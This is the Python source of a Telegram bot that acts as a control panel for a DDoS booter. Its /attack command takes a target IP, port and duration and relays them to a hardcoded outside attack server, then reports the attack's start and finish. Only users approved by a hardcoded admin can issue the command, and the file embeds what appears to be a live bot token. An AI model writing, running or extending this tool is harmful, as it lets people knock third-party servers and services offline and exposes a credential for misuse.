import time
import requests
import threading
import asyncio
from flask import Flask
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram import Update

TELEGRAM_TOKEN = "7786469113:AAFjWtBSS24y3aVgEBFvcwbLNGHwcpQRg5g"
ADMIN_ID = 1817896911
BOT_OWNER = "7H SHUBH"

approved_users = {}

def is_admin(user_id: int):
    return user_id == ADMIN_ID

def is_approved(user_id: int):
    return approved_users.get(user_id, False)

def approve_user(user_id: int):
    approved_users[user_id] = True

approve_user(ADMIN_ID)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"Welcome to {BOT_OWNER} Bot!")

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to approve users.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /approve <user_id>")
        return
    try:
        target_id = int(context.args[0])
        approve_user(target_id)
        await update.message.reply_text(f"✅ User {target_id} approved.")
    except ValueError:
        await update.message.reply_text("⚠️ Please provide a valid user ID (integer).")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this command. Please contact admin.")
        return
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time_in_seconds>")
        return

    ip, port, time_s = context.args
    try:
        time_int = int(time_s)
    except ValueError:
        await update.message.reply_text("⚠️ Invalid time. Please provide time in seconds as an integer.")
        return

    url = f"http://72.60.97.101:3001/shubha7hbysoulcrack/"
    params = {'ip': ip, 'port': port, 'time': time_s}

    try:
        response = requests.get(url, params=params, timeout=10)
        if response.status_code == 200:
            await update.message.reply_text(f"🚀 Attack started on {ip}:{port} for {time_s} seconds!")
        else:
            await update.message.reply_text(f"⚠️ Failed to start attack. Server responded with status code {response.status_code}.")
            return
    except requests.RequestException as e:
        await update.message.reply_text(f"⚠️ Network error: {e}")
        return
    await update.message.reply_text(f"⏳ Attack will run for {time_int} seconds...")
    await asyncio.sleep(time_int)
    await update.message.reply_text(f"✅ Attack on {ip}:{port} finished! 🎉🔥")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⚠️ Stop command is not implemented.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("ℹ️ Status check is not implemented.")

def run_telegram_bot():
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("status", status))
    application.run_polling()

app = Flask(__name__)

@app.route("/")
def index():
    return "Bot is running!"

if __name__ == "__main__":
    threading.Thread(target=run_telegram_bot).start()
    app.run(host="0.0.0.0", port=10000)
    